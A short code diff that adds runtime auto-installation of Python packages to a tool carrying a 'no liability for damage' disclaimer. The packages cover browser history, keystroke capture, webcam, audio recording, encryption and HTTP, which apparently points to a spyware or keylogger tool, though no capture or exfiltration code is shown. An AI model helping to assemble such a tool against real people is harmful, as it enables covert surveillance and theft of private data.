@@ -6,6 +6,27 @@ The author accepts no liability for damage caused by this tool.
 If these terms are not acceptable to you, then do not use this tool.
 """
 
+REQUIRED_PACKAGES = {
+    "browserhistory": "browserhistory",
+    "requests": "requests",
+    "cryptography": "cryptography",
+    "pynput": "pynput",
+    "cv2": "opencv-python",
+    "sounddevice": "sounddevice",
+    "scipy": "scipy"
+}
+
+def install_if_missing(module, pip_name):
+    try:
+        __import__(module)
+    except ImportError:
+        print(f"[INFO] Module '{module}' manquant → installation de '{pip_name}'")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
+
+for module, pip_name in REQUIRED_PACKAGES.items():
+    install_if_missing(module, pip_name)
+
+
 import json
 import logging
 import os
